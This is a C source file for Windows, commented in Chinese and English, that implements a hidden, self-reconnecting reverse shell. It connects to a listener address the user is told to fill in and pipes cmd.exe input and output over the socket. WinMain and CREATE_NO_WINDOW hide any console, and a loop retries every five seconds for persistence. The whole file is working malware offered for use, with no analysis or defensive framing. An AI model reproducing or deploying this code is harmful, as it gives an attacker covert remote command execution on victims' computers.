#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32")

// 使用 WinMain 确保程序作为 GUI 应用运行，不显示控制台窗口
// Use WinMain to ensure the app runs as a GUI process without showing a console window
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char *ip = "127.0.0.1"; // 记得填入你的监听 IP | Remember to fill in your listener IP
    short port = 8877;

    // 初始化 Winsock
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    while (TRUE) {
        // 创建套接字
        // Create a socket
        s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (s == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }

        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(ip);

        // 尝试连接
        // Attempt to connect to the listener
        if (WSAConnect(s, (struct sockaddr *)&addr, sizeof(addr), NULL, NULL, NULL, NULL) != SOCKET_ERROR) {
            
            // 连接成功，配置重定向
            // Connection successful, configure handle redirection
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES;
            // 将 cmd 的输入、输出和错误流重定向到 Socket
            // Redirect cmd's stdin, stdout, and stderr to the socket
            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

            // 启动 cmd.exe，并设置 CREATE_NO_WINDOW 标志
            // Launch cmd.exe with the CREATE_NO_WINDOW flag
            if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                // 等待进程结束（例如远程输入 exit）
                // Wait for the process to exit (e.g., when 'exit' is received)
                WaitForSingleObject(pi.hProcess, INFINITE);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }

        // 无论是连接失败还是 cmd 退出，都关闭当前套接字并进入下一次循环
        // Close the socket and retry upon connection failure or process exit
        closesocket(s);
        
        // 关键：延迟重连（5秒），避免死循环导致 CPU 飙升
        // Important: Sleep for 5s before reconnecting to prevent high CPU usage
        Sleep(5000);
    }

    WSACleanup();
    return 0;
}